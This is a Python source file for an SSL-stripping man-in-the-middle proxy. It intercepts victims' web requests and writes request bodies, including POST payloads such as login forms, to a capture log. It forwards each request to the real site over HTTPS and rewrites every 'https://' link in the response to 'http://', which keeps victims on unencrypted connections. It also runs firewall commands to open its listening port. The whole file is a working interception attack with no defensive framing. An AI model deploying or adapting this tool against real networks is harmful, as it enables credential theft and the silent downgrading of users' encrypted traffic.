import os
import sys
import re
from datetime import datetime
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket
import requests
from termcolor import colored


class SslStripper:
    def __init__(self, port=80, logging=True):
        self.port = port
        self.logging = logging
        self.server = HTTPServer(("", self.port), self.create_forwarding_handler())

    def create_forwarding_handler(self):  # Create forwarding handler with set configuration
        logging = self.logging

        class ForwardingHandler(SimpleHTTPRequestHandler):
            def __init__(self, *args, **kwargs):
                super().__init__(*args, **kwargs)

            def forward_request(self, method):
                # Get host and path from headers
                host = self.headers.get("Host")

                if "localhost" in host.lower():
                    return  # Ignore requests to localhost

                print(colored(f"[SSL] Forwarding request to https://{host}{self.path}.", "light_grey"))

                # Read payload from request
                content_length = int(self.headers.get("Content-Length", 0))
                payload = self.rfile.read(content_length)

                decoded_payload = payload.decode("utf-8")  # Decode payload to string

                if logging:  # If logging is enabled for SslStripper class
                    with open("captures.log", "a") as f:  # Log request to file
                        timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
                        # Write capture as line
                        f.write(f"[{timestamp}] [{method.upper()}] http://{host}{self.path}"
                                f"{" - " + repr(decoded_payload) if method.upper() != "GET" else ""}\n")

                # Print payload to terminal on POST request
                if method == "POST":
                    print(colored(f"[SSL] Captured POST payload: {repr(decoded_payload)}.", "light_grey"))

                # Forward request to specified host with payload
                try:
                    response = requests.request(method, f"https://{host}{self.path}", data=payload)
                except requests.exceptions.RequestException as e:
                    raise Exception() from e

                # Downgrade all HTTPS references to HTTP
                response_payload = re.sub(b"https://", b"http://", response.content)

                # Return response with payload to client
                self.send_response(response.status_code)
                self.send_header("Content-type", response.headers.get("Content-type"))
                self.end_headers()
                self.wfile.write(response_payload)

            class BadRequestException(Exception):  # Custom exception for bad requests
                def __init__(self, message):
                    super().__init__(message)

            def handle_exceptions(self, e):
                if isinstance(e, self.BadRequestException):
                    self.send_error(400, str(e))
                else:
                    self.send_error(500, str(e))

            def handle_request(self, method="GET"):
                try:
                    self.forward_request(method)
                except Exception as e:
                    self.handle_exceptions(e)

            def do_GET(self):
                self.handle_request()

            def do_POST(self):
                self.handle_request("POST")

            def do_PUT(self):
                self.handle_request("PUT")

            def do_DELETE(self):
                self.handle_request("DELETE")

            def do_PATCH(self):
                self.handle_request("PATCH")

            def do_HEAD(self):
                self.handle_request("HEAD")

            def do_OPTIONS(self):
                self.handle_request("OPTIONS")

            def do_TRACE(self):
                self.handle_request("TRACE")

            def do_CONNECT(self):
                self.handle_request("CONNECT")

            def do_OTHER(self):
                raise self.BadRequestException("Unsupported request method")

            def log_message(self, format, *args):
                pass  # Suppress printing of log messages

        return ForwardingHandler

    def is_port_in_use(self):
        try:
            requests.get(f"http://localhost:{self.port}", timeout=3)  # Await response for 3 seconds
            return True
        except requests.exceptions.RequestException:
            return False

    def is_port_open(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.bind(("", self.port))
            return True
        except OSError:
            return False
        finally:
            s.close()

    def open_port(self):
        platform_id = sys.platform  # Determine the OS

        if platform_id == "win32":  # Windows
            # Command to open a port through Windows Firewall
            cmd = f"netsh advfirewall firewall add rule name=\"Allow Port {self.port}\" dir=in action=allow protocol=TCP localport={self.port}"
            os.system(cmd)  # Execute command
        else:  # Linux
            cmd = f"sudo ufw allow {self.port}/tcp"  # Command to open a port through UFW
            os.system(cmd)  # Execute command

    def close_port(self):
        platform_id = sys.platform  # Determine the OS

        if platform_id == "win32":  # Windows
            cmd = f"netsh advfirewall firewall delete rule name=\"Allow Port {self.port}\""
            os.system(cmd)
        else:  # Linux
            cmd = f"sudo ufw deny {self.port}/tcp"  # Command to close a port through UFW
            os.system(cmd)  # Execute command

    def start(self):
        if self.is_port_in_use():
            print(colored(f"[SSL] Error: Port {self.port} is already in use. Terminate the process and retry.", "red"))
            return

        # while not self.is_port_open():
        #     print(colored(f"[SSL] Port {self.port} is closed. Opening port and retrying...", "light_grey"))
        #     self.open_port()
        #     time.sleep(3)

        print(colored(f"[SSL] Started proxy server on port {self.port}.", "light_grey"))
        self.server.serve_forever()

    def stop(self):
        self.server.shutdown()
